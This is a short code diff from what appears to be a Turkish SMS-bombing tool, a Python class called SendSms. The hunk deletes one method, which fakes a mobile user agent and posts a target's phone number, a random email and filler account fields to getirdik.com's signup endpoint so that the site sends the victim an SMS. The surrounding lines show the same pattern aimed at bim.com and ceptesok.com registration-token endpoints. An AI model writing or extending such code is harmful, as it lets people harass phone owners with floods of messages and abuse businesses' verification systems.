@@ -364,18 +364,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.com")
             
         
-    #getirdik.com--sms
-    def getirdik(self):
-        headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"}
-        data = {"Tp": "CreateQuery", "Var1": "Memati", "Var2": "Bas", "Var3": self.phone, "Var4": f"{self.random_mail}@gmail.com", "Var5": "31ABC..abc31", "Var6": "31ABC..abc31", "Var7": "1"}
-        getirdik = requests.post("https://test2.getirdik.com.tr:443/PProfile",  headers=headers, data=data)
-        if getirdik.status_code == 200:
-            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> getirdik.com")
-            self.adet += 1
-        else:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> getirdik.com")
-    
-    
     #ceptesok.com--sms--zaman-1dk
     def sok(self):
         json={"mobile_number": self.phone, "token_type": "register_token"}
